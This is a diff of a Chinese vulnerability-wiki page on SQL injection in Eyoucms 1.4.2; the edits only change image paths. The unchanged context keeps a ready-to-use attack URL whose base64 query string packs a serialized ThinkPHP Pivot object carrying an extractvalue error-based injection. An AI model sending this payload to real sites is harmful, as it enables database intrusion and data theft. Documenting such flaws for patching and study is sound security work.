@@ -44,7 +44,7 @@ Payload:
 先说一下我们的反序列化利用点，到后面会调用\_\_toString函数。而我们这里就可以跳过构造think\\process\\pipes\\Windows
 类。直接去构造继承Model类的子类。流程如下：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.4.2sql注入/media/rId24.png)
+![](./.resource/Eyoucms1.4.2sql注入/media/rId24.png)
 
 toArray()代码在这（一部分）
 
@@ -136,4 +136,4 @@ toArray()代码在这（一部分）
 
     http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czo2NToidXNlcnNfaWQgPSA1KSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDVjLChzZWxlY3QgdXNlcigpKSkpKSMiO319
 
-![](/Users/aresx/Documents/VulWiki/.resource/Eyoucms1.4.2sql注入/media/rId25.png)
+![](./.resource/Eyoucms1.4.2sql注入/media/rId25.png)
